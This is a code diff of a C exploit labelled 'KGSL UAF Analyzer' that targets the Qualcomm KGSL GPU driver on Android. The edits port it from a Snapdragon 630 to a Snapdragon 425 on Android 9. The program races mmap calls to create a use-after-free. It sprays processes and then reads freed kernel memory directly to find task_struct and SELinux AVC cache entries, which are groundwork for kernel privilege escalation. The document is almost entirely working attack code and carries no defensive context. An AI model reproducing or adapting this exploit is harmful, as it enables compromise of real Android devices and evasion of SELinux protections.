@@ -22,7 +22,6 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/sysmacros.h>
-#include <sched.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -70,19 +69,18 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-#define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x4000000ULL          // 64MB (reduced from 268MB)
+/* 32-bit environment: addresses are within 4GB space */
+#define UAF_ADDR  0x70000000ULL
+#define UAF_SIZE  0x2000000ULL          /* 32MB */
 #define OVERLAP_ADDR 0x7001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
 #define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL // keep original huge value
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x4000000ULL   // 64MB (reduced from 260MB)
+#define BOGUS_SIZE 0xffff0000ULL        /* ~4GB-64KB, within 32bit max */
+#define PLACEHOLDER_ADDR 0x72000000ULL
+#define PLACEHOLDER_SIZE 0x2000000ULL   /* 32MB */
 
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
-#define AVC_PAGES_PER_IB 12
-#define PRE_PAGES_PER_IB 4
 #define CHURN_MAX_PATHS 20000
 
 static int kgsl_fd = -1;
@@ -104,20 +102,6 @@ static const char *churn_dirs[] = {
 };
 
 static void die(const char *msg) { perror(msg); exit(1); }
-
-static uint32_t pm4_parity(uint32_t v) {
-    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
-}
-static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
-    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
-}
-#define CP_NOP 0x10
-#define CP_MEM_WRITE 0x3D
-#define CP_MEM_TO_MEM 0x73
-
-static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
-    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
-}
 
 static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
@@ -143,30 +127,6 @@ static unsigned int create_context(void) {
     struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
     if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
     return c.drawctxt_id;
-}
-static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
-    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
-    for (int i = 0; i < 100000; i++) {
-        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
-        if (r.timestamp >= target) return 0;
-        usleep(100);
-    }
-    return -2;
-}
-static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
-    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
-    struct kgsl_command_object cmd_obj = {
-        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
-        .flags = KGSL_CMDLIST_IB, .id = ib_id
-    };
-    struct kgsl_gpu_command gc = {0};
-    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
-    gc.cmdsize = sizeof(cmd_obj);
-    gc.numcmds = 1;
-    gc.context_id = ctx_id;
-    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
-    if (out_ts) *out_ts = gc.timestamp;
-    return ret;
 }
 
 static void phase1_rbtree(void) {
@@ -208,7 +168,7 @@ static bool phase2_race(void) {
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
 
     int hit = 0;
-    for (int i = 0; i < 100000000; i++) {
+    for (int i = 0; i < 20000000; i++) {
         void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
             PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
             kgsl_fd, (off_t)ov_id << 12);
@@ -222,7 +182,7 @@ static bool phase2_race(void) {
             hit = 1;
             break;
         }
-        if (i % 10000000 == 0) printf("  race %d/100000000 errno=%d\n", i, e);
+        if (i % 2000000 == 0) printf("  race %d/20000000 errno=%d\n", i, e);
     }
 
     race_done = 1;
@@ -317,125 +277,53 @@ static void churn_round(void) {
     mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
 }
 
-static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
-                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                              uint64_t scan_start, uint64_t end_va,
+/* CPU-based scan for task_struct comm string */
+static int prescan_task_pages(void *uaf_base, uint64_t scan_start, uint64_t end_va,
                               uint64_t *out_vas, int maxout) {
-    uint32_t *cmd = (uint32_t *)ib_m;
-    uint32_t *data = (uint32_t *)dst_m;
-    int n = 0, dw;
-    unsigned int ts;
+    uint8_t *ptr = (uint8_t *)uaf_base;
+    int n = 0;
     uint64_t va = scan_start;
     while (va < end_va && n < maxout) {
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, PRE_PAGES_PER_IB * SCAN_DWORDS * 4);
-        dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        int batch = 0;
-        for (; batch < PRE_PAGES_PER_IB && va < end_va; batch++, va += 0x1000) {
-            for (int w = 0; w < SCAN_DWORDS; w++) {
-                uint32_t dl, dh, sl, sh;
-                split64(dst_ga + (batch * SCAN_DWORDS + w) * 4, &dl, &dh);
-                split64(va + w * 4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
+        uint32_t *data = (uint32_t *)(ptr + (va - UAF_ADDR));
+        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
+            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
+                out_vas[n++] = va;
+                printf("[TASK] va=0x%lx\n", (unsigned long)va);
+                break;
             }
         }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
-        if (wait_timestamp(ctx_id, ts) < 0) break;
-        __sync_synchronize();
-        uint64_t pva = va - batch * 0x1000;
-        for (int p = 0; p < batch; p++) {
-            uint32_t *pd = &data[p * SCAN_DWORDS];
-            int found = 0;
-            for (int i = 0; i < SCAN_DWORDS - 1 && !found; i++)
-                if (pd[i] == 0x4B534154 && pd[i+1] == 0x21464155) found = 1;
-            if (found && n < maxout) {
-                out_vas[n++] = pva + p * 0x1000;
-                printf("[TASK] va=0x%lx\n", (unsigned long)(pva + p * 0x1000));
-            }
-        }
+        va += 0x1000;
     }
     return n;
 }
 
-static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
-                             void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                             uint64_t *vas, int npages, int stride) {
-    uint32_t *cmd = (uint32_t *)ib_m;
-    uint32_t *data = (uint32_t *)dst_m;
-    int idx = 0, total_nodes = 0;
-    unsigned int ts;
+/* CPU-based scan for AVC nodes */
+static int analyze_avc_pages(void *uaf_base, uint64_t *vas, int npages, int stride) {
+    uint8_t *ptr = (uint8_t *)uaf_base;
+    int total_nodes = 0;
     int nodes_per_page = 4096 / stride;
     if (nodes_per_page == 0) return 0;
 
-    while (idx < npages) {
-        int max_nodes_per_batch = (0x10000 - 256) / (4 * 6 * 4);
-        if (max_nodes_per_batch < 1) max_nodes_per_batch = 1;
-        int max_pages = max_nodes_per_batch / nodes_per_page;
-        if (max_pages < 1) max_pages = 1;
-        int batch = npages - idx;
-        if (batch > max_pages) batch = max_pages;
-
-        int node_dws = batch * nodes_per_page * 4;
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, node_dws * 4);
-        int dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int p = 0; p < batch; p++) {
-            uint64_t va = vas[idx + p];
-            for (int n = 0; n < nodes_per_page; n++) {
-                uint64_t node_va = va + n * stride;
-                uint32_t dofs = (p * nodes_per_page + n) * 4;
-                for (int w = 0; w < 4; w++) {
-                    uint32_t dl, dh, sl, sh;
-                    split64(dst_ga + (dofs + w) * 4, &dl, &dh);
-                    split64(node_va + w * 4, &sl, &sh);
-                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                    cmd[dw++] = sl; cmd[dw++] = sh;
-                }
+    for (int p = 0; p < npages; p++) {
+        uint64_t va = vas[p];
+        uint8_t *page = ptr + (va - UAF_ADDR);
+        for (int n = 0; n < nodes_per_page; n++) {
+            uint64_t node_va = va + n * stride;
+            uint32_t *nd = (uint32_t *)(page + n * stride);
+            uint32_t ssid = nd[0], tsid = nd[1], tclass = nd[2], allowed = nd[3];
+            if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
+                total_nodes++;
+                printf("[AVC_NODE] stride=%d va=0x%lx+0x%x ssid=%u tsid=%u tclass=%u allowed=0x%x\n",
+                    stride, (unsigned long)va, n*stride, ssid, tsid, tclass, allowed);
             }
         }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        if (dw * 4 > 0x10000) {
-            printf("[-] Command buffer overflow! dw=%d\n", dw);
-            return total_nodes;
-        }
-        __sync_synchronize();
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) {
-            printf("[-] submit_ib failed\n");
-            break;
-        }
-        if (wait_timestamp(ctx_id, ts) < 0) {
-            printf("[-] wait_timestamp failed\n");
-            break;
-        }
-        __sync_synchronize();
-
-        for (int p = 0; p < batch; p++) {
-            uint64_t va = vas[idx + p];
-            for (int n = 0; n < nodes_per_page; n++) {
-                uint32_t *nd = &data[(p * nodes_per_page + n) * 4];
-                uint32_t ssid = nd[0], tsid = nd[1], tclass = nd[2], allowed = nd[3];
-                if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
-                    total_nodes++;
-                    printf("[AVC_NODE] stride=%d va=0x%lx+0x%x ssid=%u tsid=%u tclass=%u allowed=0x%x\n",
-                        stride, (unsigned long)va, n*stride, ssid, tsid, tclass, allowed);
-                }
-            }
-        }
-        idx += batch;
     }
     return total_nodes;
 }
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] KGSL UAF Analyzer (optimized for SD630/Adreno508)\n");
+    printf("[*] KGSL UAF Analyzer for Snapdragon 425 / Android 9 (Adreno 3xx)\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
@@ -444,8 +332,7 @@ int main(int argc, char **argv) {
     printf("[*] Phase 1: rbtree setup\n");
     phase1_rbtree();
 
-    printf("[*] Phase 2: race (BOGUS_SIZE=0x%lx, BOGUS_ADDR=0x%lx)\n",
-           (unsigned long)BOGUS_SIZE, (unsigned long)BOGUS_ADDR);
+    printf("[*] Phase 2: race\n");
     if (!phase2_race()) { close(kgsl_fd); return 1; }
 
     printf("[*] Phase 3: free UAF\n");
@@ -460,56 +347,31 @@ int main(int argc, char **argv) {
     unsigned int ctx_id = create_context();
     printf("[GPU] context=%u\n", ctx_id);
 
-    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
-    void *ib_m = gpuobj_mmap(0x10000, ib_id);
-    uint64_t ib_ga = 0;
-    gpuobj_info(ib_id, &ib_ga);
+    /* No need for IB/dst objects, we use CPU scanning */
 
-    int dst_id = gpuobj_alloc(0x10000, alloc_flags);
-    void *dst_m = gpuobj_mmap(0x10000, dst_id);
-    uint64_t dst_ga = 0;
-    gpuobj_info(dst_id, &dst_ga);
-
-    printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);
+    void *uaf_base = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
+        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
+    if (uaf_base == MAP_FAILED) die("mmap UAF (post-free)");
 
     uint64_t task_pgs[4096];
-    int n_task = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
+    int n_task = prescan_task_pages(uaf_base,
         UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
     printf("[TASK] Found %d task_struct pages\n", n_task);
 
     if (n_task > 0) {
-        uint32_t *data = (uint32_t *)dst_m;
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        int dw = 0;
-        uint32_t *cmd = (uint32_t *)ib_m;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < SCAN_DWORDS; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i*4, &dl, &dh);
-            split64(task_pgs[0] + i*4, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
-            wait_timestamp(ctx_id, ts);
-            __sync_synchronize();
-            int comm_off = -1;
-            for (int i = 0; i < SCAN_DWORDS - 2; i++) {
-                if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
-                    comm_off = i * 4;
-                    break;
-                }
+        int comm_off = -1;
+        uint8_t *ptr = (uint8_t *)uaf_base;
+        uint32_t *data = (uint32_t *)(ptr + (task_pgs[0] - UAF_ADDR));
+        for (int i = 0; i < SCAN_DWORDS - 2; i++) {
+            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
+                comm_off = i * 4;
+                break;
             }
-            if (comm_off != -1)
-                printf("[TASK] comm offset = 0x%x\n", comm_off);
-            else
-                printf("[TASK] comm string not found\n");
         }
+        if (comm_off != -1)
+            printf("[TASK] comm offset = 0x%x\n", comm_off);
+        else
+            printf("[TASK] comm string not found\n");
     }
 
     kill_spray_children();
@@ -534,8 +396,7 @@ int main(int argc, char **argv) {
     for (int si = 0; si < num_strides; si++) {
         int s = strides[si];
         printf("[AVC] Scanning with stride=%d...\n", s);
-        int n = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
-                                  task_pgs, n_task, s);
+        int n = analyze_avc_pages(uaf_base, task_pgs, n_task, s);
         if (n > 0) {
             found = 1;
             best_stride = s;
@@ -554,8 +415,7 @@ int main(int argc, char **argv) {
         for (int si = 0; si < num_strides; si++) {
             int s = strides[si];
             printf("[AVC] Scanning entire range with stride=%d...\n", s);
-            int n = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
-                                      all_vas, n_all, s);
+            int n = analyze_avc_pages(uaf_base, all_vas, n_all, s);
             if (n > 0) {
                 found = 1;
                 best_stride = s;
